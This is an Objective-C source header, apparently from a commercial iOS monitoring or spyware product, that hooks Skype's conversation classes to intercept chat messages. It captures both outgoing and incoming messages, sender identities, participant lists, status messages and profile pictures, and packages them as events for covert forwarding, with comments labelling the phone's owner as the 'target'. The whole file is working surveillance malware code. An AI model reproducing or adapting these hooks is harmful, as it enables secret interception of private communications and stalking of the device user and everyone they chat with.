/*
 *  Skype.h
 *  MSFSP
 *
 *  Created by Makara Khloth on 12/7/12.
 *  Copyright 2012 __MyCompanyName__. All rights reserved.
 *
 */

#import "SKConversationManager.h"
#import "SKConversation.h"
#import "SKMessage.h"
#import	"SKParticipant.h"
#import "SKContact.h"
#import "SkypeUtils.h"
#import "FxIMEvent.h"
#import	"FxRecipient.h"
#import "SKAccountManager.h"
#import "SKAccount.h"

#pragma mark -
#pragma mark Capture OUTGOING skype in chat view
#pragma mark -
// version 4.2.2604, 4.5.222, 4.6 
HOOK(SKConversation, insertObject$inMessagesAtIndex$, void, id aMsgObj, unsigned index) {
	DLog (@">>>>>>>>>>>>>>>> (OUT) SKConversation --> insertObject")
    CALL_ORIG(SKConversation, insertObject$inMessagesAtIndex$, aMsgObj, index);
	SKMessage *msgObj = aMsgObj;
	DLog (@"index = %d", index);
	DLog (@"msgObj = %@", msgObj);
	
	// Direction
	int direction = kEventDirectionUnknown;
	if ([msgObj isOutbound]) {
		direction					= kEventDirectionOut;
		NSString *message			= [msgObj body];
		NSString *userId			= [msgObj identity];				// sender
		NSString *userDisplayName	= [msgObj authorDisplayName];		// sender
		NSString *imServiceId		= @"skp";
		NSString *senderStatusMessage = nil;
		NSData *senderPictureData	= nil;
		// Participants: Skype store everyone in conversation
		NSArray *origParticipants			= [self participants];
		NSMutableArray *tempParticipants	= [origParticipants mutableCopy];
	
		// Remove sender from participants list
		for (int i=0; i < [origParticipants count]; i++) {			
			if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
				// -- get sender's status message 
				SKContact *contact = [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
				senderStatusMessage = [contact moodMessage];			
				senderPictureData = [contact avatarImageData];
				//[senderPictureData writeToFile:@"/tmp/skypeImage2.jpg" atomically:YES];
				[tempParticipants removeObjectAtIndex:i];
				break;
			}
		}
		// Map to FxRecipient array
		NSMutableArray *finalParticipants = [NSMutableArray array];
		for (SKParticipant *obj in tempParticipants) {	
			FxRecipient *participant = [[FxRecipient alloc] init];
			[participant setRecipNumAddr:[obj identity]];
			[participant setRecipContactName:[obj displayName]];								
			[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
			[participant setMPicture:[[obj contact] avatarImageData]];					
			DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
			//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];		
			[finalParticipants addObject:participant];
			[participant release];
		}
		[tempParticipants release];
		
		DLog(@"mDirection->%d", direction);
		DLog(@"mUserID->%@", userId);
		DLog(@"mUserDisplayName->%@", userDisplayName);
		DLog(@"mParticipants->%@", finalParticipants);
		DLog(@"mIMServiceID->%@", imServiceId);
		DLog(@"mMessage->%@", message);
		DLog(@"mAttachments->%d", [msgObj isChatMessage]);
		DLog (@"converstion displayName = %@", [self displayName]);
		DLog (@"conversationIdentifier = %@", [self conversationIdentifier]);
		//DLog (@"convoGUID %@", [msgObj convoGUID])
		DLog (@"sender status message %@", senderStatusMessage)
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setMUserID:userId];								// sender
		[imEvent setMIMServiceID:imServiceId];		
		[imEvent setMDirection:(FxEventDirection)direction];
		[imEvent setMMessage:message];
		[imEvent setMUserDisplayName:userDisplayName];				// sender
		[imEvent setMParticipants:finalParticipants];
		[imEvent setMAttachments:[NSArray array]];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];		
		// new
		[imEvent setMServiceID:kIMServiceSkype];
		[imEvent setMRepresentationOfMessage:kIMMessageText];
		[imEvent setMConversationID:[self conversationIdentifier]];
		[imEvent setMConversationName:[self displayName]];
		[imEvent setMUserStatusMessage:senderStatusMessage];		// sender status message
		[imEvent setMUserPicture:senderPictureData];				// sender image profile
		//DLog (@"senderPictureData : %d", [senderPictureData length])
		[imEvent setMConversationPicture:nil];
		[imEvent setMUserLocation:nil];
		[imEvent setMShareLocation:nil];
			
		[SkypeUtils sendSkypeEvent:imEvent];
		[imEvent release];
		
	} else {
		// Incoming is captured in another method below
	}
}

#pragma mark -
#pragma mark Capture INCOMING skype in chat view or new message in other chat view
#pragma mark -
// version 4.2.2604, 4.5.222
HOOK(SKConversationManager, insertObject$inUnreadConversationsAtIndex$, void, id aConvObj, unsigned index) {
	DLog (@">>>>>>>>>>>>>>>> (IN) SKConversationManager --> insertObject")
	SKConversation *conversation = aConvObj;
	// Value of index always 0
	DLog (@"All messages = %@", [conversation messages]);
	
//	for (id eachMessage in [conversation messages]) {
//		DLog (@"--------------------------------------------")
//		DLog (@"MSG: %@", eachMessage)
//		DLog (@"skyLibDBID %d", [eachMessage skyLibDBID])
//		DLog (@"skyLibObjectID %d", [eachMessage skyLibObjectID])
//		DLog (@"body %@", [eachMessage body])
//		DLog (@"isUnread %d", [eachMessage isUnread])
//		DLog (@"--------------------------------------------")
//	}
	
	// METHOD1: (not work properly, missed some messages)
	//	SKMessage *msgObj = [conversation lastRelevantMessage];
	//	SKMessage *latestMsg = [conversation latestMessage];
	
	// METHOD2:
	// When Skype start up the conversation array contains 0 element
	// If user send message fast (supper fast) there might be lost message
	SKMessage *msgObj = [[conversation messages] lastObject];
	SKMessage *latestMsg = nil;
	
	DLog (@"msgObj = %@ latestMsg = %@", msgObj, latestMsg);
	DLog (@"===================== %@ ====================", [conversation firstRelevantMessage]);
	
    CALL_ORIG(SKConversationManager, insertObject$inUnreadConversationsAtIndex$, aConvObj, index);

	if (msgObj && ![msgObj isOutbound]) {
		// When latest message is not nil, that's mean incoming new message is in current chat view otherwise
		// in other chat view
		if (latestMsg) {
			msgObj = latestMsg;
		}
		
		NSString *message = [msgObj body];
		NSString *userId = [msgObj identity];
		NSString *userDisplayName = [msgObj authorDisplayName];
		NSString *imServiceId = @"skp";
		NSString *senderStatusMessage = nil;
		NSData *senderPictureData	= nil;
		
		// Direction
		int direction = kEventDirectionUnknown;
		if ([msgObj isOutbound]) {
			direction = kEventDirectionOut;
		} else {
			direction = kEventDirectionIn;
		}
		// Participants: Skype store everyone in conversation
		NSArray *origParticipants = [conversation participants];
		DLog (@"origParticipants %@", origParticipants)
		
		NSMutableArray *tempParticipants = [origParticipants mutableCopy];
		// Remove sender from participants list
		for (int i=0; i < [origParticipants count]; i++) {
			if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
				// -- get sender's status message
				SKContact *contact = [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
				senderStatusMessage = [contact moodMessage];			
				senderPictureData = [contact avatarImageData];
				DLog (@"senderPictureData %d", [senderPictureData length])
				//[senderPictureData writeToFile:@"/tmp/skypeImageIn.jpg" atomically:YES];
				[tempParticipants removeObjectAtIndex:i];
				break;
			}
		}
		
		Class $SKAccountManager(objc_getClass("SKAccountManager"));
		SKAccount *currentAccount			= [[$SKAccountManager sharedManager] currentAccount];	// SKAccount
		DLog (@"account identity %@", [currentAccount identity])
		
		// Map to FxRecipient array
		NSMutableArray *finalParticipants = [NSMutableArray array];
		for (SKParticipant *obj in tempParticipants) {
			FxRecipient *participant = [[FxRecipient alloc] init];
			[participant setRecipNumAddr:[obj identity]];
			[participant setRecipContactName:[obj displayName]];
			[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
			DLog (@">>> CONTACT PICTURE: %d", [[[obj contact] avatarImageData] length])
			[participant setMPicture:[[obj contact] avatarImageData]];	
			DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
			//DLog (@"> participant picture   %d", [[[obj contact] avatarImageData] length])
			//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];
			
			if ([[obj identity] isEqualToString:[(SKAccount *)currentAccount identity]]) {		// target									
				DLog (@"target so insert at 1st index")
				[finalParticipants insertObject:participant	atIndex:0];
				
			} else {																			// not target
				[finalParticipants addObject:participant];				
			}			
			[participant release];
		}
		[tempParticipants release];
		
		DLog(@"mDirection->%d", direction);
		DLog(@"mUserID->%@", userId);
		DLog(@"mUserDisplayName->%@", userDisplayName);
		DLog(@"mParticipants->%@", finalParticipants);
		DLog(@"mIMServiceID->%@", imServiceId);
		DLog(@"mMessage->%@", message);
		DLog(@"mAttachments->%d", [msgObj isChatMessage]);
		DLog (@"converstion displayName = %@", [conversation displayName]);
		DLog (@"conversationIdentifier = %@", [conversation conversationIdentifier])
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setMUserID:userId];
		[imEvent setMIMServiceID:imServiceId];
		[imEvent setMDirection:(FxEventDirection)direction];
		[imEvent setMMessage:message];
		[imEvent setMUserDisplayName:userDisplayName];		
		[imEvent setMParticipants:finalParticipants];
		[imEvent setMAttachments:[NSArray array]];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		// new
		[imEvent setMServiceID:kIMServiceSkype];
		[imEvent setMRepresentationOfMessage:kIMMessageText];
		[imEvent setMConversationID:[conversation conversationIdentifier]];
		[imEvent setMConversationName:[conversation displayName]];
		[imEvent setMUserStatusMessage:senderStatusMessage];		// sender status message
		[imEvent setMUserPicture:senderPictureData];				// sender image profile
		[imEvent setMConversationPicture:nil];
		[imEvent setMUserLocation:nil];
		[imEvent setMShareLocation:nil];
				
		[SkypeUtils sendSkypeEvent:imEvent];
		[imEvent release];
	} else {
		// Outgoing is captured in another method above
	}
}
